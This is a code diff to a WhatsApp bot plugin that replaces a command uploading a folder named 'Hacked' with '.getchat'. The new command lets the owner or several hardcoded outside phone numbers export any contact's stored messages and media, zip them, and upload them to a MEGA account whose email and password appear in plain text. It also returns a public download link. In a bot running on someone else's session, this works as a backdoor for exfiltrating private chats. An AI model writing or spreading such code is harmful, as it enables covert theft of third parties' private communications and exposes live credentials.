@@ -577,17 +577,18 @@ cmd({
 });
 //
 const fs = require('fs');
+const fse = require('fs-extra'); // optional but handy
 const path = require('path');
 const AdmZip = require('adm-zip');
 const { Storage } = require('megajs');
 
 cmd({
-  pattern: "get",
-  desc: "Zip folder and upload to MEGA (owner-limited + specific numbers only)",
+  pattern: "getchat",
+  desc: "Zip a specific chat's messages and media, upload to MEGA (owner + allowed numbers)",
   category: "owner",
   fromMe: true,
   filename: __filename
-}, async (conn, m, msg, { isOwner, reply }) => {
+}, async (conn, m, msg, { isOwner, args, reply }) => {
   try {
     // ---------- allowed numbers ----------
     const allowedNumbers = [
@@ -596,96 +597,226 @@ cmd({
       "94724375368"
     ];
 
-    // get sender number in numeric form (works for private/group)
-    const rawSender = (m && (m.sender || (m.key && m.key.participant) || m.key && m.key.remoteJid)) || "";
-    let senderNumber = rawSender.toString().replace(/@.*$/,""); // remove @s.whatsapp.net
-    // sometimes remoteJid contains :0 or :1 suffix in some libs, remove that
-    senderNumber = senderNumber.replace(/:\d+$/,"");
+    // get sender number (works for many libs)
+    const rawSender = (m && (m.sender || (m.key && m.key.participant) || (m.key && m.key.remoteJid))) || "";
+    let senderNumber = rawSender.toString().replace(/@.*$/,"").replace(/:\d+$/,"");
 
-    // check permission: owner OR allowed numbers only
+    // permission check: must be owner or in allowedNumbers
     if (!isOwner && !allowedNumbers.includes(senderNumber)) {
       return await reply("🚫 You are not allowed to use this command.");
     }
 
-    // ---------- check MEGA creds ----------
+    // parse target phone from args
+    if (!args || !args[0]) return await reply("❗ Usage: .getchat <phone_number>\nExample: .getchat 94711451319");
+
+    let target = args[0].toString().replace(/\D/g, ""); // keep digits only
+    if (!/^\d{7,15}$/.test(target)) return await reply("❗ Invalid phone number provided.");
+
+    // build possible chatIds
+    const chatIds = [
+      `${target}@s.whatsapp.net`,
+      `${target}@c.us`
+      // add more variations if your lib uses different suffixes
+    ];
+
+    // helper to extract messages from various conn shapes
+    const getChatMessages = async (chatId) => {
+      // Try common places depending on library
+      // 1) conn.store && conn.store.messages[chatId] (Baileys older)
+      try {
+        if (conn.store && conn.store.messages && conn.store.messages[chatId]) {
+          const map = conn.store.messages[chatId];
+          // map may be a Map or object; normalize to array
+          if (typeof map.forEach === 'function') {
+            const arr = [];
+            map.forEach((v, k) => arr.push(v));
+            return arr;
+          } else if (Array.isArray(map)) {
+            return map;
+          } else if (typeof map === 'object') {
+            return Object.values(map);
+          }
+        }
+      } catch (e) {}
+
+      // 2) conn.chats (some libs)
+      try {
+        if (conn.chats && (conn.chats[chatId] || (typeof conn.chats.get === 'function' && conn.chats.get(chatId)))) {
+          const chatObj = conn.chats[chatId] || conn.chats.get(chatId);
+          if (chatObj && chatObj.messages) {
+            if (Array.isArray(chatObj.messages)) return chatObj.messages;
+            if (typeof chatObj.messages.forEach === 'function') {
+              const arr = []; chatObj.messages.forEach((v) => arr.push(v)); return arr;
+            }
+            return Object.values(chatObj.messages || {});
+          }
+        }
+      } catch (e) {}
+
+      // 3) conn.msgs or conn.messages store
+      try {
+        if (conn.msgs && typeof conn.msgs.filter === 'function') {
+          // filter messages by key.remoteJid
+          const arr = conn.msgs.filter(item => {
+            const jid = (item && (item.key && item.key.remoteJid)) || (item && item.remoteJid) || "";
+            return jid === chatId;
+          });
+          if (arr && arr.length) return arr;
+        }
+      } catch (e) {}
+
+      // 4) conn.loadMessages? try to call if exists (Baileys helpers)
+      try {
+        if (typeof conn.loadMessages === 'function') {
+          const { messages } = await conn.loadMessages(chatId, 1000); // try to load up to 1000
+          if (messages && messages.length) return messages;
+        }
+      } catch (e) {}
+
+      // 5) fallback: try to fetch via conn.fetchMessages / conn.query
+      // (left as fallback for specific implementations)
+      return null;
+    };
+
+    // find a chatId that yields messages
+    let messages = null;
+    let foundChatId = null;
+    for (const id of chatIds) {
+      messages = await getChatMessages(id);
+      if (messages && messages.length) {
+        foundChatId = id;
+        break;
+      }
+    }
+
+    if (!messages || messages.length === 0) {
+      return await reply(`❌ Could not find messages for ${target}. Ensure the bot has that chat in its store.`);
+    }
+
+    // ---------- prepare local folder ----------
+    const rootPath = path.join(__dirname, "..");
+    const exportBase = path.join(rootPath, "chat_exports");
+    await fse.ensureDir(exportBase);
+
+    const folderName = `chat_${target}_${Date.now()}`;
+    const exportFolder = path.join(exportBase, folderName);
+    await fse.ensureDir(exportFolder);
+
+    // save messages JSON (normalized)
+    const normalized = [];
+    // We'll attempt to also download media if possible
+    await reply(`⏳ Preparing ${messages.length} messages. Downloading media where possible...`);
+
+    for (let i = 0; i < messages.length; i++) {
+      const msgObj = messages[i];
+      // make a shallow copy to avoid circular structures
+      const meta = {
+        id: msgObj.key ? msgObj.key.id || msgObj.key.remoteJid || null : (msgObj.id || null),
+        from: (msgObj.key && msgObj.key.fromMe) ? "me" : (msgObj.key && msgObj.key.participant) || foundChatId,
+        timestamp: (msgObj.messageTimestamp || (msgObj.key && msgObj.key.timestamp) || msgObj.timestamp || null),
+        message: msgObj.message || msgObj // keep actual message payload
+      };
+
+      // detect media and try to download
+      try {
+        const hasImage = msgObj.message && (msgObj.message.imageMessage || msgObj.message['imageMessage']);
+        const hasVideo = msgObj.message && (msgObj.message.videoMessage || msgObj.message['videoMessage']);
+        const hasAudio = msgObj.message && (msgObj.message.audioMessage || msgObj.message['audioMessage']);
+        const hasSticker = msgObj.message && (msgObj.message.stickerMessage || msgObj.message['stickerMessage']);
+        const hasDocument = msgObj.message && (msgObj.message.documentMessage || msgObj.message['documentMessage']);
+        let mediaType = null;
+        if (hasImage) mediaType = 'image';
+        else if (hasVideo) mediaType = 'video';
+        else if (hasAudio) mediaType = 'audio';
+        else if (hasSticker) mediaType = 'sticker';
+        else if (hasDocument) mediaType = 'document';
+
+        if (mediaType && typeof conn.downloadMediaMessage === 'function') {
+          // downloadMediaMessage usually accepts the message object
+          try {
+            const mediaBuffer = await conn.downloadMediaMessage(msgObj).catch(()=>null);
+            if (mediaBuffer) {
+              const extMap = { image: '.jpg', video: '.mp4', audio: '.mp3', sticker: '.webp', document: '' };
+              const ext = extMap[mediaType] || '';
+              const filename = `msg_${i + 1}_${msgObj.key ? msgObj.key.id : i}${ext}`;
+              const filePath = path.join(exportFolder, filename);
+              fs.writeFileSync(filePath, mediaBuffer);
+              meta.mediaSaved = filename;
+              meta.mediaType = mediaType;
+            }
+          } catch (e) {
+            // ignore single media errors
+            meta.mediaSaved = null;
+          }
+        } else if (mediaType) {
+          meta.mediaSaved = null;
+          meta.note = "Media exists but conn.downloadMediaMessage not available";
+        }
+      } catch (e) {
+        // continue
+      }
+
+      normalized.push(meta);
+    }
+
+    // write messages JSON
+    fs.writeFileSync(path.join(exportFolder, "messages.json"), JSON.stringify(normalized, null, 2));
+
+    // ---------- zip the folder ----------
+    const zipName = `chat_${target}_${Date.now()}.zip`;
+    const zipPath = path.join(rootPath, zipName);
+    const zip = new AdmZip();
+    zip.addLocalFolder(exportFolder, path.basename(exportFolder));
+    zip.writeZip(zipPath);
+
+    // cleanup export folder (optional) — keep for debugging, but we'll remove it
+    try { await fse.remove(exportFolder); } catch (e) {}
+
+    // ---------- upload to MEGA ----------
     const MEGA_EMAIL = 'nadeenpoornagit@gmail.com';
     const MEGA_PASSWORD = 'Nadeen@1234';
     if (!MEGA_EMAIL || !MEGA_PASSWORD) {
-      return await reply("❗ MEGA credentials not set. Set env vars MEGA_EMAIL and MEGA_PASSWORD.");
+      // remove local zip before returning
+      try { fs.unlinkSync(zipPath); } catch (e) {}
+      return await reply("❗ MEGA credentials not set. Set MEGA_EMAIL and MEGA_PASSWORD env vars.");
     }
 
-    // ---------- paths ----------
-    const rootPath = path.join(__dirname, "..");
-    const targetFolder = path.join(rootPath, "Hacked"); // change if needed
-    if (!fs.existsSync(targetFolder)) {
-      return await reply("❌ Target folder not found: " + targetFolder);
-    }
+    await reply("⏳ Logging in to MEGA and uploading zip (may take a while)...");
+    const storage = new Storage({ email: MEGA_EMAIL, password: MEGA_PASSWORD });
 
-    const zipName = `backup-${Date.now()}.zip`;
-    const zipPath = path.join(rootPath, zipName);
-
-    // ---------- create zip ----------
-    await reply("⏳ Creating zip archive...");
-    const zip = new AdmZip();
-    zip.addLocalFolder(targetFolder, path.basename(targetFolder));
-    zip.writeZip(zipPath);
-
-    // ---------- login to MEGA ----------
-    await reply("⏳ Logging in to MEGA...");
-    const storage = new Storage({
-      email: MEGA_EMAIL,
-      password: MEGA_PASSWORD
-    });
-
-    // wait for storage ready (use event or promise)
     await new Promise((resolve, reject) => {
       storage.on('ready', resolve);
       storage.on('error', reject);
-      // timeout fallback
       setTimeout(() => reject(new Error('MEGA login timeout')), 30000);
     });
 
-    // ensure /Backups folder exists (create if not)
+    // ensure Backups folder exists
     const backupsFolderName = "Backups";
     let backupsFolder = storage.root.children.find(ch => ch.directory && ch.name === backupsFolderName);
     if (!backupsFolder) {
-      backupsFolder = await storage.mkdir(backupsFolderName); // create folder in root
+      backupsFolder = await storage.mkdir(backupsFolderName);
     }
 
-    await reply("⏳ Uploading zip to MEGA... (this may take a while for large files)");
-
-    // create read stream and upload (megajs requires size or piping)
+    // upload
     const stats = fs.statSync(zipPath);
-    const fileStream = fs.createReadStream(zipPath);
-
-    // upload into backupsFolder by specifying path option
-    // Note: upload returns a writable stream object – use .complete to await
-    const uploadStream = storage.upload({
-      name: zipName,
-      size: stats.size,
-      // parent: backupsFolder.nodeId // megajs will place at root by default; to place in folder, we will use backupsFolder.upload (if available)
-    }, fileStream);
-
-    // If backupsFolder supports upload, prefer that:
+    const readStream = fs.createReadStream(zipPath);
     let uploadedFile;
     if (backupsFolder && typeof backupsFolder.upload === 'function') {
-      // pipe into folder upload
       const folderUpload = backupsFolder.upload({ name: zipName, size: stats.size });
-      fileStream.pipe(folderUpload);
+      readStream.pipe(folderUpload);
       uploadedFile = await new Promise((res, rej) => {
         folderUpload.on('complete', file => res(file));
         folderUpload.on('error', err => rej(err));
       });
     } else {
-      // fallback to storage.upload root and then move/rename if needed
-      uploadedFile = await uploadStream.complete;
+      const up = storage.upload({ name: zipName, size: stats.size }, readStream);
+      uploadedFile = await up.complete;
     }
 
-    // ---------- generate public link ----------
+    // generate public link if possible
     let publicLink = null;
     try {
-      // file.link(cb) OR await file.link() depending on version
-      if (typeof uploadedFile.link === 'function') {
+      if (uploadedFile && typeof uploadedFile.link === 'function') {
         publicLink = await new Promise((res, rej) => {
           uploadedFile.link((err, url) => {
             if (err) return rej(err);
@@ -693,28 +824,23 @@ cmd({
           });
         });
       } else if (uploadedFile && uploadedFile.link) {
-        // sometimes link returns string or promise
         publicLink = await uploadedFile.link();
       }
-    } catch (err) {
-      console.error("Link generation failed:", err);
+    } catch (e) {
+      console.error("Link generation failed:", e);
     }
 
     // cleanup local zip
     try { fs.unlinkSync(zipPath); } catch (e) {}
 
     if (publicLink) {
-      await conn.sendMessage(m.chat, {
-        text: `✅ Backup uploaded to MEGA!\n\nLink: ${publicLink}\n\nUploaded by: ${senderNumber}`
-      }, { quoted: m });
+      await conn.sendMessage(m.chat, { text: `✅ Chat export uploaded to MEGA!\n\nLink: ${publicLink}\nFor chat: ${target}` }, { quoted: m });
     } else {
-      await conn.sendMessage(m.chat, {
-        text: `✅ Uploaded to MEGA but couldn't generate public link programmatically. Check your MEGA account or create a link manually.`
-      }, { quoted: m });
+      await conn.sendMessage(m.chat, { text: `✅ Uploaded to MEGA but couldn't automatically generate a public link. Check your MEGA account.` }, { quoted: m });
     }
 
   } catch (err) {
-    console.error("Error in .get command:", err);
+    console.error("Error in .getchat:", err);
     try { await reply("❌ Error: " + (err.message || String(err))); } catch (e) {}
   }
 });
